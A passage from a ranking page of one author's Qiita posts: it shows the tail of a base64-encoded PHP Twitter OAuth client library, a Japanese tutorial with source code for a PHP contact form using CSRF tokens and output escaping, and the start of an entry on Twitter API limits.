class="nx">IVtcZC5dKVtcdy5dKysvJywkcFsncGF0aCddLCRwYXJ0cyk6dGhyb3cgbmV3IEludmFsaWRBcmd1bWVudEV4Y2VwdGlvbigiSW52YWxpZCBlbmRwb2ludDogeyRlbmRwb2ludH0iKTt9JHN0cmVhbWluZz0kbXVsdGlwYXJ0PSRvbGQ9ISRob3N0PSdhcGkudHdpdHRlci5jb20nO2ZvcmVhY2goJHBhcnRzWzBdYXMgJGk9PiYkcGFydCl7JHBhcnQ9c3RydG9sb3dlcigkcGFydCk7aWYoJGNvdW50PT09JGkrMSl7c3dpdGNoKHRydWUpe2Nhc2UkcGFydHNbMF1bMF09PT0nb2F1dGgyJzp0aHJvdyBuZXcgSW52YWxpZEFyZ3VtZW50RXhjZXB0aW9uKCJUaGlzIGxpYnJhcnkgZG9lcyBub3Qgc3VwcG9ydCBPQXV0aCAyLjAgYXV0aGVudGljYXRpb24iKTtjYXNlJHBhcnRzWzBdWzBdPT09J29hdXRoJzokcGFydD1iYXNlbmFtZSgkcGFydCwnLmpzb24nKTticmVhayAyO2Nhc2Ukb2xkPSRwYXJ0c1swXVswXT09PSd1cmxzJ2FuZCAkaG9zdD0ndXJscy5hcGkudHdpdHRlci5jb20nOmNhc2Ukb2xkPSRwYXJ0c1swXVswXT09PSdnZW5lcmF0ZSc6Y2FzZSRzdHJlYW1pbmc9JHBhcnRzWzBdWzBdPT09J3VzZXInYW5kICRob3N0PSd1c2Vyc3RyZWFtLnR3aXR0ZXIuY29tJzpjYXNlJHN0cmVhbWluZz0kcGFydHNbMF1bMF09PT0nc2l0ZSdhbmQgJGhvc3Q9J3NpdGVzdHJlYW0udHdpdHRlci5jb20nOmNhc2Ukc3RyZWFtaW5nPWluX2FycmF5KCRwYXJ0LCRzdHJlYW1pbmdzKWFuZCAkaG9zdD0nc3RyZWFtLnR3aXR0ZXIuY29tJzpkZWZhdWx0OiRtdWx0aXBhcnQ9JHBhcnQ9PT0ndXBkYXRlX3dpdGhfbWVkaWEnOyRwYXJ0PWJhc2VuYW1lKCRwYXJ0LCcuanNvbicpLicuanNvbic7YXJyYXlfc3BsaWNlKCRwYXJ0c1swXSwwLDAsJG9sZD8nMSc6JzEuMScpO2JyZWFrIDI7fX19JHRoaXMtPmhvc3Q9JGhvc3Q7JHRoaXMtPmVuZHBvaW50PScvJy5pbXBsb2RlKCcvJywkcGFydHNbMF0pOyR0aGlzLT5leHRyYVBhcmFtcz1pc3NldCgkcFsncXVlcnknXSk</span><span class="o">/</span><span class="nx">c2VsZjo6cGFyc2VRdWVyeSgkcFsncXVlcnknXSk6YXJyYXkoKTskdGhpcy0</span><span class="o">+</span><span class="nx">c3RyZWFtaW5nPSRzdHJlYW1pbmc7JHRoaXMtPm11bHRpcGFydD0kbXVsdGlwYXJ0O3JldHVybiAkdGhpczt9cHJpdmF0ZSBmdW5jdGlvbiBzb2x2ZVBhcmFtcygpeyRuZXc9YXJyYXkoKTskcGFyYW1zPSR0aGlzLT5wYXJhbXMrJHRoaXMtPmV4dHJhUGFyYW1zO2ZvcmVhY2goJHBhcmFtcyBhcyAka2V5PT4kdmFsdWUpe2lmKCR2YWx1ZT09PW51bGwpe2NvbnRpbnVlO31pZigkdmFsdWU9PT1mYWxzZSl7JHZhbHVlPScwJzt9JHZhbHVlPXNlbGY6OmZpbHRlcigkdmFsdWUpO2lmKHN0cnBvcygka2V5LCdAJyk9PT0wKXtpZighaXNfcmVhZGFibGUoJHZhbHVlKW9yIWlzX2ZpbGUoJHZhbHVlKSl7dGhyb3cgbmV3IEludmFsaWRBcmd1bWVudEV4Y2VwdGlvbigiRmlsZSBub3QgZm91bmQ6IHskdmFsdWV9Iik7fSRrZXk9KHN0cmluZylzdWJzdHIoJGtleSwxKTskdmFsdWU9ZmlsZV9nZXRfY29udGVudHMoJHZhbHVlKTtpZighJHRoaXMtPm11bHRpcGFydCl7JHZhbHVlPWJhc2U2NF9lbmNvZGUoJHZhbHVlKTt9fSRuZXdbJGtleV09JHZhbHVlO31yZXR1cm4gJG5ldzt9cHJpdmF0ZSBmdW5jdGlvbiBidWlsZE9BdXRoUGFydChhcnJheSAkcGFyYW1zKXtpZihpbl9hcnJheSgkdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQsYXJyYXkoJy9vYXV0aC9hdXRob3JpemUnLCcvb2F1dGgvYXV0aGVudGljYXRlJyksdHJ1ZSkpeyRib2RpZXNbJ29hdXRoX3Rva2VuJ109JHRoaXMtPmNyZWRlbnRpYWwtPnJlcXVlc3RUb2tlbjskYm9kaWVzWydmb3JjZV9sb2dpbiddPScxJztpZigkdGhpcy0</span><span class="o">+</span><span class="nx">bWV0aG9kPT09J1BPU1QnKXskYm9kaWVzWydhdXRoZW50aWNpdHlfdG9rZW4nXT0kdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">YXV0aGVudGljaXR5VG9rZW47JGJvZGllc1snc2Vzc2lvblt1c2VybmFtZV9vcl9lbWFpbF0nXT0kdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">c2NyZWVuTmFtZTskYm9kaWVzWydzZXNzaW9uW3Bhc3N3b3JkXSddPSR0aGlzLT5jcmVkZW50aWFsLT5wYXNzd29yZDt9cmV0dXJuIHNlbGY6OmJ1aWxkUXVlcnkoJGJvZGllcyk7fSRib2RpZXM9YXJyYXkoJ29hdXRoX2NvbnN1bWVyX2tleSc9PiR0aGlzLT5jcmVkZW50aWFsLT5jb25zdW1lcktleSwnb2F1dGhfc2lnbmF0dXJlX21ldGhvZCc9PidITUFDLVNIQTEnLCdvYXV0aF90aW1lc3RhbXAnPT50aW1lKCksJ29hdXRoX3ZlcnNpb24nPT4nMS4wYScsJ29hdXRoX25vbmNlJz0</span><span class="o">+</span><span class="nx">c2hhMShtdF9yYW5kKCkubWljcm90aW1lKCkpLCk7JGtleXM9YXJyYXkoJHRoaXMtPmNyZWRlbnRpYWwtPmNvbnN1bWVyU2VjcmV0LCcnKTtpZigkdGhpcy0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQ9PT0nL29hdXRoL2FjY2Vzc190b2tlbicpeyRib2RpZXNbJ29hdXRoX3Rva2VuJ109JHRoaXMtPmNyZWRlbnRpYWwtPnJlcXVlc3RUb2tlbjskYm9kaWVzWydvYXV0aF92ZXJpZmllciddPSR0aGlzLT5jcmVkZW50aWFsLT52ZXJpZmllcjska2V5c1sxXT0kdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">cmVxdWVzdFRva2VuU2VjcmV0O31lbHNlaWYoJHRoaXMtPmVuZHBvaW50IT09Jy9vYXV0aC9yZXF1ZXN0X3Rva2VuJyl7JGJvZGllc1snb2F1dGhfdG9rZW4nXT0kdGhpcy0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">YWNjZXNzVG9rZW47JGtleXNbMV09JHRoaXMtPmNyZWRlbnRpYWwtPmFjY2Vzc1Rva2VuU2VjcmV0O30kY29weT0kYm9kaWVzO2lmKCEkdGhpcy0</span><span class="o">+</span><span class="nx">bXVsdGlwYXJ0KXskY29weSs9JHBhcmFtczt9JHVybD0iaHR0cHM6Ly97JHRoaXMtPmhvc3R9eyR0aGlzLT5lbmRwb2ludH0iOyRjb3B5PXNlbGY6OmJ1aWxkUXVlcnkoYXJyYXkoJHRoaXMtPm1ldGhvZCwkdXJsLHNlbGY6OmJ1aWxkUXVlcnkoJGNvcHkpKSxmYWxzZSk7JGtleXM9c2VsZjo6YnVpbGRRdWVyeSgka2V5cyxmYWxzZSk7JGJvZGllc1snb2F1dGhfc2lnbmF0dXJlJ109YmFzZTY0X2VuY29kZShoYXNoX2htYWMoJ3NoYTEnLCRjb3B5LCRrZXlzLHRydWUpKTtyZXR1cm4gc2VsZjo6YnVpbGRRdWVyeSgkYm9kaWVzKTt9fWFic3RyYWN0IGNsYXNzIFR3aXN0VW5zZXJpYWxpemFibGUgZXh0ZW5kcyBUd2lzdEJhc2V7ZmluYWwgcHVibGljIGZ1bmN0aW9uIF9fc2xlZXAoKXt0aHJvdyBuZXcgQmFkTWV0aG9kQ2FsbEV4Y2VwdGlvbignVGhpcyBvYmplY3QgY2Fubm90IGJlIHNlcmlhbGl6ZWQuJyk7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3Rocm93IG5ldyBCYWRNZXRob2RDYWxsRXhjZXB0aW9uKCdUaGlzIHNlcmlhbCBjYW5ub3QgYmUgdW5zZXJpYWxpemVkLicpO319</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />18位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>66</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/b4dc02ed8aa3ba7c5b5c">PHPで作るメールフォーム</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-17 03:03:50</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="メールフォーム作成" class="fragment"></span><a href="#%E3%83%A1%E3%83%BC%E3%83%AB%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>メールフォーム作成</h1>

<p>以下のサイト様からソースコードを一部拝借しています。</p>

<ul>
<li><strong><a href="http://www.web4life.jp/archives/108" rel="nofollow noopener" target="_blank">webに生きる人+α - PHPのmb_send_mail()を使った時にgmailだけメールが届かない</a></strong></li>
<li><strong><a href="http://tech.aainc.co.jp/archives/3570" rel="nofollow noopener" target="_blank">Allied ArchitectsEngineer BlogRSS - PHPでJIS以外の文字を文字化けせずに日本語メールを送る方法</a></strong></li>
<li><strong><a href="http://blog.veryposi.info/programing/php/php-appli-contactform-2/" rel="nofollow noopener" target="_blank">VeryPosi - PHP応用 コンタクトフォームの作成 入力チェックの追加</a></strong></li>
</ul>

<p>3番目のエントリのPHPロジック部分は全然ダメなのですが、サッと作れるデザインとしてはなかなか気に入ったので…ｗ</p>

<h2>
<span id="ソースコード" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>ソースコード</h2>

<p>sendmailに渡す <strong><code>-f</code></strong> (<strong>Return-Path</strong>) は適切に指定してください。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * RuntimeExceptionを生成する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * 例外スタックを配列に変換する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* 変数の初期化 */</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'contents'</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">,</span> <span class="s1">'confirm'</span><span class="p">,</span> <span class="s1">'execute'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="nv">$v</span><span class="p">));</span>
<span class="p">}</span>

<span class="cm">/* セッションの初期化 */</span>
<span class="nb">session_name</span><span class="p">(</span><span class="s1">'ContactForm'</span><span class="p">);</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="p">}</span>

<span class="cm">/* 「確認」か「送信」のときのみ実行 */</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$confirm</span> <span class="k">or</span> <span class="nv">$execute</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="c1">// トークンをチェック</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'フォームの有効期限が切れています。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// トークンを消費させる</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]);</span>
        <span class="c1">// 各項目チェック</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前を入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'メールアドレスを入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'メールアドレスが不正です。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// 例外がここまでに1つでも発生していればスローする</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// 「送信」のとき</span>
        <span class="k">if</span> <span class="p">(</span>
            <span class="nv">$execute</span> <span class="k">and</span>
            <span class="o">!</span><span class="nb">mb_internal_encoding</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="o">||</span>
            <span class="o">!</span><span class="nb">mail</span><span class="p">(</span>
                <span class="s1">'info@example.com'</span><span class="p">,</span>
                <span class="nb">mb_encode_mimeheader</span><span class="p">(</span><span class="s1">'フォームからの送信'</span><span class="p">,</span> <span class="s1">'ISO-2022-JP-MS'</span><span class="p">),</span>
                <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nv">$contents</span><span class="p">,</span> <span class="s1">'ISO-2022-JP-MS'</span><span class="p">),</span>
                <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                    <span class="s1">'Content-Type: text/plain; charset=ISO-2022-JP'</span><span class="p">,</span>
                    <span class="s1">'From: '</span> <span class="o">.</span> <span class="nb">mb_encode_mimeheader</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">'ISO-2022-JP-MS'</span><span class="p">)</span>
                             <span class="o">.</span> <span class="s1">' &lt;'</span> <span class="o">.</span> <span class="nv">$email</span> <span class="o">.</span> <span class="s1">'&gt;'</span><span class="p">,</span>
                <span class="p">)),</span>
                <span class="s1">'-f info@example.com'</span>
            <span class="p">)</span>
        <span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'メール送信でエラーが発生しました。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 最初の画面に戻す</span>
        <span class="nv">$confirm</span> <span class="o">=</span> <span class="nv">$execute</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/* 「最初」か「確認」のときのみ実行 */</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$execute</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 値をダミーにしてトークンをキー部分に生成(最大10個まで保持)</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="nv">$token</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">())</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="mi">10</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="c1">// ヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">&lt;html xmlns="http://www.w3.org/1999/xhtml" lang="ja"&gt;</span>
<span class="x">  &lt;head&gt;</span>
<span class="x">    &lt;title&gt;Contact Form&lt;/title&gt;</span>
<span class="x">    &lt;style type="text/css"&gt;&lt;![CDATA[</span>
<span class="x">      h1 {</span>
<span class="x">        color: red;</span>
<span class="x">        font-size: 18pt;</span>
<span class="x">      }</span>
<span class="x">      #contact-form th {</span>
<span class="x">        background-color: #9bdbea;</span>
<span class="x">        padding: 10px 20px;</span>
<span class="x">      }</span>
<span class="x">      #contact-form td {</span>
<span class="x">        background-color: #f7f7ef;</span>
<span class="x">        padding: 10px 20px;</span>
<span class="x">      }</span>
<span class="x">      #contact-form td input {</span>
<span class="x">        width: 400px;</span>
<span class="x">      }</span>
<span class="x">      #contact-form td textarea {</span>
<span class="x">        width: 400px;</span>
<span class="x">      }</span>
<span class="x">      form {</span>
<span class="x">        display: inline;</span>
<span class="x">      }</span>
<span class="x">      #errmsg {</span>
<span class="x">        background-color:#E7D3D6;</span>
<span class="x">        border:3px solid #A55952;</span>
<span class="x">        color:#944121;</span>
<span class="x">        font-size:12px;</span>
<span class="x">        margin:10px;</span>
<span class="x">        padding:10px;</span>
<span class="x">        text-align:left;</span>
<span class="x">        width:400px;</span>
<span class="x">      }</span>
<span class="x">    ]]&gt;&lt;/style&gt;</span>
<span class="x">  &lt;/head&gt;</span>
<span class="x">  &lt;body&gt;</span>
<span class="x">    &lt;h1&gt;コンタクトフォーム&lt;/h1&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;div id="errmsg"&gt;</span>
<span class="x">      &lt;ul&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &lt;li&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="cp">?&gt;</span><span class="x">&lt;/li&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">      &lt;/ul&gt;</span>
<span class="x">    &lt;/div&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$execute</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;p&gt;送信しました。ご意見ありがとうございました。&lt;br /&gt;&lt;a href=""&gt;戻る&lt;/a&gt;&lt;/p&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$confirm</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;p&gt;この内容で送信しますか？&lt;/p&gt;</span>
<span class="x">    &lt;p&gt;</span>
<span class="x">      &lt;form action="" method="post"&gt;</span>
<span class="x">        &lt;table id="contact-form" border="1" cellpadding="0" cellspacing="0"&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;名前(必須)&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;メールアドレス(必須)&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;内容&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;&lt;pre&gt;</span><span class="cp">&lt;?</span><span class="o">=</span>
              <span class="nv">$contents</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span>
              <span class="nx">h</span><span class="p">(</span><span class="nv">$contents</span><span class="p">)</span> <span class="o">:</span>
              <span class="s1">'&lt;span style="color:red;"&gt;【未入力】&lt;/span&gt;'</span>
            <span class="cp">?&gt;</span><span class="x">&lt;/pre&gt;&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th colspan="2"&gt;</span>
<span class="x">              &lt;input type="hidden" name="name" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;</span>
<span class="x">              &lt;input type="hidden" name="email" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;</span>
<span class="x">              &lt;input type="hidden" name="contents" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$contents</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;</span>
<span class="x">              &lt;input type="hidden" name="token" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;</span>
<span class="x">              &lt;input type="submit" name="execute" value="送信" /&gt;</span>
<span class="x">              &lt;input type="submit" value="修正" /&gt;</span>
<span class="x">            &lt;/th&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">        &lt;/table&gt;</span>
<span class="x">      &lt;/form&gt;</span>
<span class="x">    &lt;/p&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">else</span><span class="o">:</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;p&gt;</span>
<span class="x">      &lt;form action="" method="post"&gt;</span>
<span class="x">        &lt;table id="contact-form" border="1" cellpadding="0" cellspacing="0"&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;名前(必須)&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;&lt;input type="text" name="name" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;メールアドレス(必須)&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;&lt;input type="text" name="email" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th&gt;内容&lt;/th&gt;</span>
<span class="x">            &lt;td&gt;&lt;textarea name="contents" rows="10"&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$contents</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;/td&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">          &lt;tr&gt;</span>
<span class="x">            &lt;th colspan="2"&gt;&lt;input type="submit" name="confirm" value="確認" /&gt;&lt;/th&gt;</span>
<span class="x">          &lt;/tr&gt;</span>
<span class="x">        &lt;/table&gt;</span>
<span class="x">        &lt;div&gt;&lt;input type="hidden" name="token" value="</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">" /&gt;&lt;/div&gt;</span>
<span class="x">      &lt;/form&gt;</span>
<span class="x">    &lt;/p&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">  &lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />19位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>65</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/32d44a063389236c0a65">TwitterのAPI制限 [2017/05/07現在]</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-04 18:53:02</center>
	</td>
